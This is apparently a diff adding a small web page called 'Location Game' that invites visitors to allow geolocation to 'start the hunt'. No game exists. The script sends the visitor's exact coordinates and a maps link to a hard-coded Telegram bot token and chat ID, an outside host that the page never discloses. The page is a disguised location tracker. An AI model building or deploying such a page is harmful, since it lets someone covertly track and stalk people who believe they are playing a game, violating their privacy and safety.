@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Location Game</title>
+
+  <!-- PWA Manifest -->
+  <link rel="manifest" href="manifest.json" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <link rel="icon" href="https://iili.io/FWysYHx.md.png" type="image/png" />
+
+  <style>
+    body {
+      background: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    h1 {
+      margin-bottom: 10px;
+    }
+
+    button {
+      background: #28a745;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    #message {
+      margin-top: 20px;
+      color: #ffc107;
+    }
+  </style>
+</head>
+<body>
+  <h1>📍 Location Game</h1>
+  <p>Allow location to start the hunt!</p>
+  <button onclick="getLocation()">Start the Hunt</button>
+  <div id="message"></div>
+
+  <script>
+    function getLocation() {
+      const message = document.getElementById('message');
+      message.textContent = 'Requesting location...';
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        message.textContent = 'Geolocation not supported.';
+      }
+    }
+
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const link = `https://www.google.com/maps?q=${lat},${lon}`;
+      const messageText = `📍 New Player Location:\nLatitude: ${lat}\nLongitude: ${lon}\n\n[Open in Maps](${link})`;
+
+      const token = "7592762647:AAGk_PjuVSCAvjsafvxFWxxKTIipRtzv64M";
+      const chatId = "5099451464";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: messageText,
+          parse_mode: "Markdown"
+        })
+      }).then(() => {
+        document.getElementById('message').textContent = '✅ Location sent successfully!';
+      }).catch(() => {
+        document.getElementById('message').textContent = '❌ Failed to send location.';
+      });
+    }
+
+    function showError(error) {
+      const message = document.getElementById('message');
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          message.textContent = 'User denied the request for Geolocation.';
+          break;
+        case error.POSITION_UNAVAILABLE:
+          message.textContent = 'Location information is unavailable.';
+          break;
+        case error.TIMEOUT:
+          message.textContent = 'The request to get user location timed out.';
+          break;
+        default:
+          message.textContent = 'An unknown error occurred.';
+          break;
+      }
+    }
+
+    // Register service worker
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('service-worker.js')
+          .then(reg => console.log('✅ Service Worker registered:', reg))
+          .catch(err => console.log('❌ Service Worker registration failed:', err));
+      });
+    }
+  </script>
+</body>
+</html>
